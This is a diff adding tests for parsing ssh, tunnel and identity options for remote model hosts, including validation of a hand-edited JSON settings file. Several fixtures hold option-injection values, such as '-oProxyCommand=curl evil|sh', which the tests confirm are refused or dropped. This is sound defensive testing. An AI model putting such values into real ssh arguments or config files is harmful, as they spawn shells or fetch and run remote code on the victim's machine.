@@ -102,3 +102,130 @@ test("remove reports whether anything was actually removed", () => {
   assert.equal(miss.removed, false);
   assert.equal(miss.hosts.length, 1);
 });
+
+/* ────────────────────────────────────────────────────────────────────────────
+ * 2026-09-25: ssh, tunnels, and the fact that a settings file is untrusted input.
+ * ──────────────────────────────────────────────────────────────────────────── */
+
+test("--ssh with no value inherits the host from the URL", () => {
+  const r = parseRemoteArgs("gpu-box.lan --ssh");
+  assert.equal(r.ok, true);
+  if (!r.ok) return;
+  // Typing the same name twice is a papercut, and a mismatch between the two would be a bug
+  // the user could not see.
+  assert.deepEqual(r.entry.ssh, { host: "gpu-box.lan" });
+});
+
+test("--ssh takes a full user@host:port", () => {
+  const r = parseRemoteArgs("gpu-box.lan --ssh phoenix@gpu-box.lan:2222 --identity /k/id_ed25519");
+  assert.equal(r.ok, true);
+  if (!r.ok) return;
+  assert.deepEqual(r.entry.ssh, {
+    host: "gpu-box.lan",
+    user: "phoenix",
+    port: 2222,
+    identityFile: "/k/id_ed25519",
+  });
+});
+
+test("a hostile --ssh value is refused at parse time, not at spawn time", () => {
+  const r = parseRemoteArgs("gpu-box.lan --ssh -oProxyCommand=sh");
+  assert.equal(r.ok, false);
+  if (r.ok) return;
+  assert.match(r.error, /--ssh/);
+});
+
+test("--tunnel defaults to the port already given in the URL", () => {
+  const r = parseRemoteArgs("http://gpu-box.lan:1234/v1 --ssh --tunnel");
+  assert.equal(r.ok, true);
+  if (!r.ok) return;
+  // Asking for the port twice and then punishing a mismatch would be asking the user to repeat
+  // themselves for no reason.
+  assert.deepEqual(r.entry.tunnel, { remotePort: 1234 });
+});
+
+test("--tunnel can name its own remote port", () => {
+  const r = parseRemoteArgs("gpu-box.lan --ssh --tunnel 11500");
+  assert.equal(r.ok, true);
+  if (!r.ok) return;
+  assert.deepEqual(r.entry.tunnel, { remotePort: 11500 });
+});
+
+test("--tunnel without --ssh is refused, because the tunnel IS the ssh connection", () => {
+  const r = parseRemoteArgs("gpu-box.lan --tunnel");
+  assert.equal(r.ok, false);
+  if (r.ok) return;
+  assert.match(r.error, /--tunnel needs --ssh/);
+});
+
+test("--identity and --trust-new without --ssh are refused rather than silently ignored", () => {
+  assert.equal(parseRemoteArgs("gpu-box.lan --identity /k").ok, false);
+  assert.equal(parseRemoteArgs("gpu-box.lan --trust-new").ok, false);
+});
+
+test("a hand-edited settings file cannot smuggle an ssh option through the ssh block", () => {
+  // The settings file is plain JSON the user can edit, and this block becomes argv for a
+  // spawn. Trusting stored data BECAUSE it is stored is how a config file becomes a
+  // code-execution vector, so it goes through the same validator a typed host does.
+  const raw = JSON.stringify([
+    {
+      host: "gpu-box.lan",
+      baseUrl: "http://gpu-box.lan:11434/v1",
+      ssh: { host: "-oProxyCommand=curl evil|sh" },
+    },
+  ]);
+  const hosts = parseRemoteHosts(raw);
+  assert.equal(hosts.length, 1, "the host itself is still usable over plain http");
+  assert.equal(hosts[0]?.ssh, undefined, "but the poisoned ssh block is dropped");
+});
+
+test("a hand-edited identity path that is an option is dropped too", () => {
+  const raw = JSON.stringify([
+    {
+      host: "b.lan",
+      baseUrl: "http://b.lan:11434/v1",
+      ssh: { host: "b.lan", identityFile: "-oProxyCommand=sh" },
+    },
+  ]);
+  assert.equal(parseRemoteHosts(raw)[0]?.ssh, undefined);
+});
+
+test("a nonsense tunnel port is dropped, not clamped into something plausible", () => {
+  for (const remotePort of [0, -1, 70000, 1.5, "11434"]) {
+    const raw = JSON.stringify([
+      {
+        host: "b.lan",
+        baseUrl: "http://b.lan:11434/v1",
+        ssh: { host: "b.lan" },
+        tunnel: { remotePort },
+      },
+    ]);
+    assert.equal(parseRemoteHosts(raw)[0]?.tunnel, undefined, `port ${remotePort} must be dropped`);
+  }
+});
+
+test("a valid ssh + tunnel block round-trips through storage", () => {
+  const entry = {
+    host: "gpu-box.lan",
+    baseUrl: "http://gpu-box.lan:11434/v1",
+    ssh: { host: "gpu-box.lan", user: "phoenix", port: 2222 },
+    tunnel: { remotePort: 11434 },
+  };
+  const back = parseRemoteHosts(JSON.stringify([entry]));
+  assert.deepEqual(back[0]?.ssh, entry.ssh);
+  assert.deepEqual(back[0]?.tunnel, entry.tunnel);
+});
+
+test("a cached hardware probe survives storage and carries its timestamp", () => {
+  const raw = JSON.stringify([
+    {
+      host: "b.lan",
+      baseUrl: "http://b.lan:11434/v1",
+      hardware: { gpus: [{ name: "RTX 4090", totalBytes: 100 }], unparsed: [], memTotalBytes: 200 },
+      hardwareAt: "2026-09-25T10:00:00.000Z",
+    },
+  ]);
+  const h = parseRemoteHosts(raw)[0];
+  assert.equal(h?.hardware?.memTotalBytes, 200);
+  assert.equal(h?.hardwareAt, "2026-09-25T10:00:00.000Z");
+});
